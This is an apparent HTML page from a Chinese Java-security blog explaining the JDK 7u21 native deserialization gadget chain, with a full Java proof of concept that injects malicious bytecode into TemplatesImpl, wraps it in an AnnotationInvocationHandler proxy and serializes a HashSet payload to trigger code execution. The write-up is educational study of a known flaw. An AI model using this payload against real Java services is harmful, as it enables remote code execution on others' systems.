@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="jdk7u21原生反序列化它适用于Java 7u21及以前的版本。 漏洞核心在于sun.reflect.annotation.AnnotationInvocationHandler的equalsImpl方法。  在这个方法中var1来自于传参，var5则是遍历this.getMemberMethods()方法返回的方法数组。  AnnotationInvocationHandler.this.ty">
+<meta property="og:type" content="article">
+<meta property="og:title" content="jdk7u21原生反序列化">
+<meta property="og:url" content="https://dgxddd.github.io/2024/04/18/jdk7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+<meta property="og:site_name" content="jxdgx">
+<meta property="og:description" content="jdk7u21原生反序列化它适用于Java 7u21及以前的版本。 漏洞核心在于sun.reflect.annotation.AnnotationInvocationHandler的equalsImpl方法。  在这个方法中var1来自于传参，var5则是遍历this.getMemberMethods()方法返回的方法数组。  AnnotationInvocationHandler.this.ty">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20260526195844948.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20260526202012207.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20260526204103966.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20260526213021972.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20260526213218178.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20260526221621920.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20260526221937869.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20260526222210233.png">
+<meta property="article:published_time" content="2024-04-18T08:12:49.000Z">
+<meta property="article:modified_time" content="2026-05-27T08:13:54.371Z">
+<meta property="article:author" content="jxdgx">
+<meta property="article:tag" content="JDK7U21">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20260526195844948.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/logo.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+        
+      
+    
+    <!-- title -->
+    <title>jdk7u21原生反序列化 | jxdgx</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+<!-- mathjax -->
+
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+        inlineMath: [['$','$']],
+        displayMath: [['$$','$$'], ['\[','\]']]
+      }
+    });
+  </script>
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+
+<meta name="generator" content="Hexo 8.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr is-post-page">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2024/06/25/%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/04/15/CC7/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://dgxddd.github.io/2024/04/18/jdk7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://dgxddd.github.io/2024/04/18/jdk7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=jdk7u21原生反序列化"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://dgxddd.github.io/2024/04/18/jdk7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=jdk7u21原生反序列化"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://dgxddd.github.io/2024/04/18/jdk7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=jdk7u21原生反序列化"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=jdk7u21原生反序列化&body=Check out this article: https://dgxddd.github.io/2024/04/18/jdk7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://dgxddd.github.io/2024/04/18/jdk7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=jdk7u21原生反序列化"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://dgxddd.github.io/2024/04/18/jdk7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=jdk7u21原生反序列化"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://dgxddd.github.io/2024/04/18/jdk7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=jdk7u21原生反序列化"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://dgxddd.github.io/2024/04/18/jdk7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=jdk7u21原生反序列化"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://dgxddd.github.io/2024/04/18/jdk7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=jdk7u21原生反序列化&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://dgxddd.github.io/2024/04/18/jdk7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=jdk7u21原生反序列化"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#jdk7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">jdk7u21原生反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A0%B8%E5%BF%83"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞核心</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#equalsImpl%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">equalsImpl方法调用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E8%B0%83%E7%94%A8equals%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">寻找调用equals的方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hash%E7%9A%84%E8%AE%A1%E7%AE%97"><span class="toc-number">1.4.</span> <span class="toc-text">hash的计算</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">1.5.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        
+<div class="post-layout">
+  <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      
+    <h1 class="posttitle p-name" itemprop="name headline">
+        jdk7u21原生反序列化
+    </h1>
+
+
+
+      <div class="meta meta-post">
+        
+    <div class="postdate">
+      
+        <time datetime="2024-04-18T08:12:49.000Z" class="dt-published" itemprop="datePublished">2024-04-18</time>
+        
+      
+    </div>
+
+
+        
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>
+    </div>
+
+
+        
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/JDK7U21/" rel="tag">JDK7U21</a>
+    </div>
+
+
+      </div>
+    </header>
+    
+
+    <div class="content e-content" itemprop="articleBody">
+      <h1 id="jdk7u21原生反序列化"><a href="#jdk7u21原生反序列化" class="headerlink" title="jdk7u21原生反序列化"></a>jdk7u21原生反序列化</h1><p>它适用于Java 7u21及以前的版本。</p>
+<h2 id="漏洞核心"><a href="#漏洞核心" class="headerlink" title="漏洞核心"></a>漏洞核心</h2><p>在于<code>sun.reflect.annotation.AnnotationInvocationHandler</code>的equalsImpl方法。</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20260526195844948.png" alt="image-20260526195844948"></p>
+<p>在这个方法中var1来自于传参，var5则是遍历<code>this.getMemberMethods()</code>方法返回的方法数组。</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20260526202012207.png" alt="image-20260526202012207"></p>
+<p>AnnotationInvocationHandler.this.type.getDeclaredMethods();获取该类型<strong>自身定义的全部方法</strong>，如果this.type是Templates类，那么就会获取到newTransformer()或getOutputProperties() 方法，进而触发任意代码执行。那么我们现在考虑的是如何去调用equalsImpl。</p>
+<h2 id="equalsImpl方法调用"><a href="#equalsImpl方法调用" class="headerlink" title="equalsImpl方法调用"></a>equalsImpl方法调用</h2><p><code>equalsImpl</code>在<code>AnnotationInvocationHandler</code>中作为一个私有方法，我们无法直接去调用，但是，我们可以在<code>AnnotationInvocationHandler</code>唯一的公共方法，<code>invoke</code>中调用<code>equalsImpl</code>。</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20260526204103966.png" alt="image-20260526204103966"></p>
+<p>当方法名等于“equals”，且仅有一个Object类型参数时，会调用到equaIsmpl方法。而这个invoke我们可以使用动态代理来实现。现在要实现这个并在动态代理的时候其方法名为equals。</p>
+<h2 id="寻找调用equals的方法"><a href="#寻找调用equals的方法" class="headerlink" title="寻找调用equals的方法"></a>寻找调用equals的方法</h2><p><code>equals</code>方法，这个方法每个类都有，用于比较是否相等。这个是在Set实际上相当于只存储key、不存储value的Map。我们经常用Set用于去除重复元素。因为对象不重复，因此就会涉及到比较。equals是用来比较两个对象的内容是否相同。最常用的Set实现类是HashSet，实际上，HashSet仅仅是对HashMap的一个简单封装。</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20260526213021972.png" alt="image-20260526213021972"></p>
+<p>其中这个put就是hashmap的put方法我们进行跟进下去。存入键值对时，先计算<code>key</code>的哈希值并定位数组下标，若该位置已有元素则遍历链表比对；当哈希值一致且对象内存地址不同时，就会调用<code>equals()</code>方法进一步判断键是否重复。</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20260526213218178.png" alt="image-20260526213218178"></p>
+<p>这样链子就找到了，我们将<strong>代理对象</strong>作为 key 存入 HashSet，将<strong>恶意 TemplatesImpl 对象</strong>作为已存在的 key，当二者哈希值完全相同时，就会强制触发代理对象的 <code>equals()</code> 方法，进而进入动态代理的 <code>invoke()</code> 流程，最终调用 <code>equalsImpl()</code> 执行 Templates 接口下的危险方法，成功实现任意命令执行。现在要我们的代理对象hash等于TemplateImpl对象的hash。</p>
+<h2 id="hash的计算"><a href="#hash的计算" class="headerlink" title="hash的计算"></a>hash的计算</h2><p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20260526221621920.png" alt="image-20260526221621920"></p>
+<p>key.hashCode()外再没有其他变量，所以proxy对象与TemplateImpl对象的“哈希”是否相等，仅 取决于这两个对象的hashCode()是否相等。TemplateImpl的hashCode()是一个Native方法，每次运 行都会发生变化，我们理论上是无法预测的，所以想让proxy的hashCode()与之相等，只能寄希望于 proxy.hashCode()。</p>
+<p>根据动态代理的规则，我们调用<code>proxy.hashCode()</code>的时候其实会先调用其<code>invoke</code>方法：</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20260526221937869.png" alt="image-20260526221937869"></p>
+<p>我们进行查看一下hashCodeImpl</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20260526222210233.png" alt="image-20260526222210233"></p>
+<p>遍历 <code>memberValues</code> 这个 Map 里的所有键值对，通过 <strong>key 哈希值 ×127 异或 value 哈希值</strong> 的公式累加，最终返回一个合成的哈希值。</p>
+<ul>
+<li>当memberValues中只有一个key和一个value时，该哈希简化成<code>(127 * key.hashCode()) ^ value.hashCode()</code></li>
+<li>当key.hashCode()等于0时，任何数异或0的结果仍是他本身，所以该哈希简化成<code>value.hashCode()</code>。</li>
+<li>当value就是TemplateImpl对象时，这两个对象的哈希就完全相等。</li>
+</ul>
+<p>其中key.hashcode()为0时，即f5a5a608，这也是ysoserial中用到的字符串。那么proxy.hashCode()<code>就会等于</code>templatesImpl.hashCode().最后完整代码是</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 程序主入口</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. 读取本地编译好的恶意类 Evil.class 的字节码</span></span><br><span class="line">        <span class="comment">// 这个类里包含 static 静态代码块，执行 calc.exe</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\web\\code\\java\\jdk7u21\\src\\main\\java\\jxdgx\\Evil.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 构造恶意的 TemplatesImpl 对象（把 Evil 字节码塞进去）</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> (TemplatesImpl) getTemplates(bytes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 创建 HashMap，存入恶意 TemplatesImpl 对象</span></span><br><span class="line">        <span class="comment">// key：f5a5a608 是 JDK7u21 固定魔法值，用于绕过注解校验</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(<span class="string">&quot;f5a5a608&quot;</span>,templatesImpl);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 反射创建 AnnotationInvocationHandler 对象</span></span><br><span class="line">        <span class="comment">// 该类是 JDK 内部私有类，不能直接 new，必须用反射创建</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取私有构造方法：参数为 (Class, Map)</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        <span class="comment">// 强制开启私有构造方法的访问权限</span></span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 创建 handler 实例：绑定 Templates 接口和上面的恶意 HashMap</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Templates.class,hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. 构造动态代理对象</span></span><br><span class="line">        <span class="comment">// 生成一个实现了 Templates 接口的代理类</span></span><br><span class="line">        <span class="comment">// 代理对象的任何方法调用（如 hashCode()）都会交给 invocationHandler 处理</span></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">proxy</span> <span class="operator">=</span> (Templates) Proxy.newProxyInstance(</span><br><span class="line">                Proxy.class.getClassLoader(),       <span class="comment">// 类加载器</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,        <span class="comment">// 要代理的接口</span></span><br><span class="line">                invocationHandler                   <span class="comment">// 代理处理器</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6. 构造 HashSet（JDK7u21 漏洞触发的关键入口）</span></span><br><span class="line">        <span class="comment">// 原理：HashSet 反序列化时会自动调用元素的 hashCode()</span></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        set.add(proxy);          <span class="comment">// 放入代理对象</span></span><br><span class="line">        set.add(templatesImpl);  <span class="comment">// 放入恶意对象</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 7. 序列化构造好的 HashSet 对象，生成 payload 文件 1.ser</span></span><br><span class="line">        serialize(set);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 8. 本地反序列化，测试触发漏洞（弹出计算器）</span></span><br><span class="line">        unserialize(<span class="string">&quot;1.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 构造恶意 TemplatesImpl 对象</span></span><br><span class="line"><span class="comment">     * 作用：将恶意类字节码注入到 TemplatesImpl 中</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getTemplates</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 创建空的 TemplatesImpl 实例</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射设置 3 个核心私有字段</span></span><br><span class="line">        <span class="comment">// 1. _bytecodes：存放恶意类的字节码（必须是二维字节数组）</span></span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        <span class="comment">// 2. _name：类名（随便填，非空即可）</span></span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;22222&quot;</span>);</span><br><span class="line">        <span class="comment">// 3. _tfactory：必须设置，否则会空指针异常，漏洞无法触发</span></span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 序列化方法</span></span><br><span class="line"><span class="comment">     * 将 Java 对象写入文件，生成序列化 payload</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(obj);  <span class="comment">// 写入对象完成序列化</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 反序列化方法</span></span><br><span class="line"><span class="comment">     * 读取序列化文件并触发漏洞（执行命令）</span></span><br><span class="line"><span class="comment">     * readObject() 是漏洞触发点</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectInputStream.readObject();  <span class="comment">// 执行反序列化 → 触发 RCE</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 反射工具方法：修改对象的私有字段</span></span><br><span class="line"><span class="comment">     * 因为 TemplatesImpl 里的变量都是 private，必须用反射强制赋值</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 获取指定名称的字段</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        <span class="comment">// 强制开启访问权限</span></span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 给字段赋值</span></span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>总结可以这样说</p>
+<p><strong>最终目的</strong>：执行 <strong>equalsImpl</strong>（因为它会遍历调用 TemplatesImpl 的方法）。</p>
+<p><strong>equalsImpl 怎么来</strong>：必须先进入 <strong>invoke</strong>，且调用的方法是 <strong>equals</strong>。</p>
+<p><strong>invoke 怎么来</strong>：动态代理对象（proxy）的任意方法被调用，都会进 invoke。</p>
+<p><strong>equals 怎么被自动调用</strong>：利用 <strong>HashSet</strong> 反序列化时，<strong>hash 冲突 → 调用 equals</strong>。</p>
+<p><strong>hash 怎么冲突</strong>：key &#x3D; <code>f5a5a608</code>（hash&#x3D;0），让 proxy 的 hash &#x3D; templatesImpl 的 hash。</p>
+<p><strong>为什么放两个对象</strong>：proxy + templatesImpl，制造 hash 冲突，逼 HashSet 调用 equals。</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/BUTLER/articles/16478462.html">JDK7u21反序列化 - B0T1eR - 博客园</a></p>
+
+    </div>
+  </article>
+  
+    <aside class="post-sidebar-toc">
+      <div class="post-sidebar-toc-inner">
+        <div class="post-sidebar-toc-title">Contents</div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#jdk7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">jdk7u21原生反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A0%B8%E5%BF%83"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞核心</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#equalsImpl%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">equalsImpl方法调用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E8%B0%83%E7%94%A8equals%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">寻找调用equals的方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hash%E7%9A%84%E8%AE%A1%E7%AE%97"><span class="toc-number">1.4.</span> <span class="toc-text">hash的计算</span></a></li><li class="toc-item 